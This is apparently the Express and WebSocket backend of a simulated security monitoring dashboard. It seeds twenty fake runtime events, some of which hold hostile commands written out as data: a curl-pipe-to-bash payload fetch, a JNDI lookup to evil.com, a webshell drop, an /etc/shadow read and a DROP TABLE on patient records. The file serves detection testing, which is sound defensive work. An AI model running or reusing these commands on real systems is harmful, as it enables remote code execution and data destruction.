const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');

const { db, getRecentLogs, seedDatabase } = require('./db');
const { processTelemetryEvent, mockAlertsDataset } = require('./ingestion');

const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Initial DB Seed with baseline Session 5 Blockchain Data
seedDatabase();

// --- REST API Architecture (Used for historical dashboard querying) ---

app.get('/api/alerts', (req, res) => {
    getRecentLogs(50, (err, rows) => {
        if (err) {
            res.status(500).json({ error: "Failed to query the Forensic Time-Series DB" });
        } else {
            res.json(rows);
        }
    });
});

app.post('/api/telemetry/ingest', (req, res) => {
    // A Webhook endpoint simulating the direct receipt of a custom eBPF event (Testing Scenario)
    const event = req.body;
    if (!event || !event.sourceIp) {
        return res.status(400).json({ error: "Malformed Payload - Missing source IP" });
    }

    // Send through the Heuristics Engine
    processTelemetryEvent(event, broadcastAlert);
    res.status(202).json({ status: "Accepted into Flink ingestion pipeline" });
});

// Create new GET route for Deep Dive Analytics
const { analyzeIncident } = require('./ai');

app.post('/api/analyze', async (req, res) => {
    try {
        const { incident } = req.body;
        console.log(`[AI Analyst Triggered] Analyzing Incident ID: ${incident.id}`);
        const analysis = await analyzeIncident(incident);
        res.json({ analysis });
    } catch (e) {
        console.error("AI Analysis Endpoint Error", e);
        res.status(500).json({ error: "Failed to generate AI analysis." });
    }
});

// --- WebSocket Architecture (Used for Real-Time Command Center Updates) ---

// Broadcast helper: Sends newly written CRITICAL/HIGH DB entries to all React clients
function broadcastAlert(alert) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            // Re-map SQLite row format back to the React App format if needed, but it matches closely
            client.send(JSON.stringify({ type: 'NEW_ALERT', payload: alert }));
        }
    });
}

wss.on('connection', (ws) => {
    console.log('[SOC Analyst Connected]: Command Center Dashboard established secure WebSocket link.');
    ws.send(JSON.stringify({ type: 'CONNECTION_ACK', payload: 'Secure System Monitor WS Secure Link Active' }));
});

// --- Telemetry Simulation Logic (Reflecting Session 6) ---
// We feed the exact 20 runtime events from the Java execution pipeline
const runtimeEvents = [
    { action: "FILE_APPEND", file: "/var/log/tomcat/catalina.out", timestamp: 1000 },
    { action: "JVMTI_ClassLoad", className: "Exploit.class", timestamp: 2000 },
    { action: "ProcessBuilder_Exec", command: "sh -c 'curl 10.0.0.5/payload.sh | bash'", user: "java", host: "ServerA", timestamp: 3000 },
    { action: "FILE_READ", file: "/tmp/hsperfdata_root/4102", timestamp: 4000 },
    { action: "FILE_READ", file: "/opt/ehr/config/application.properties", timestamp: 5000 },
    { action: "FILE_CREATE", file: "/tmp/webshell.jsp", host: "ServerA", timestamp: 6000 },
    { action: "Java_OutOfMemoryError", host: "ServerB", timestamp: 7000 },
    { action: "FILE_READ_DENIED", file: "/etc/shadow", timestamp: 8000 },
    { action: "JNDI_Lookup", target: "ldap://evil.com/a", timestamp: 9000 },
    { action: "FILE_OPEN", file: "/opt/ehr/lib/log4j-core-2.14.0.jar", timestamp: 10000 },
    { action: "Auth_Failed_Java_App", ip: "192.168.1.100", timestamp: 11000 },
    { action: "Auth_Failed_Java_App", ip: "192.168.1.100", timestamp: 12000 },
    { action: "Auth_Failed_Java_App", ip: "192.168.1.100", timestamp: 13000 },
    { action: "Auth_Success_Java_App", ip: "192.168.1.100", timestamp: 14000 },
    { action: "SQL_DML_Bulk_Extraction", ip: "192.168.1.100", rowsReturned: 15000, timestamp: 15000 },
    { action: "JDBC_Connection_Create", poolSize: 45, target: "ehr_prod", timestamp: 16000 },
    { action: "Spring_Actuator_Access", apiPath: "/actuator/env", timestamp: 17000 },
    { action: "Auth_Failed_DBMS", user: "root", timestamp: 18000 },
    { action: "SQL_DDL_Execution", query: "DROP TABLE patient_records;", timestamp: 19000 },
    { action: "sys_execve", command: "/usr/sbin/sshd", file: "BAD_HASH_123", timestamp: 20000 }
];

setTimeout(() => {
    // Process all 20 events on boot to populate dashboard
    runtimeEvents.forEach((evt, idx) => {
        setTimeout(() => processTelemetryEvent(evt, broadcastAlert), idx * 500);
    });
}, 2000);
// To make the dashboard "live", run the standalone `HackSimulator.java` file.
// The Java endpoint agent will securely POST telemetry to the /api/telemetry/ingest endpoint above.

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`\n===========================================`);
    console.log(`[Secure System Monitor Backend Initialized]`);
    console.log(`- REST API Context: http://localhost:${PORT}`);
    console.log(`- WebSocket Stream: ws://localhost:${PORT}`);
    console.log(`- Enablers: SQLite TSDb, Flink Simulation`);
    console.log(`===========================================\n`);
});
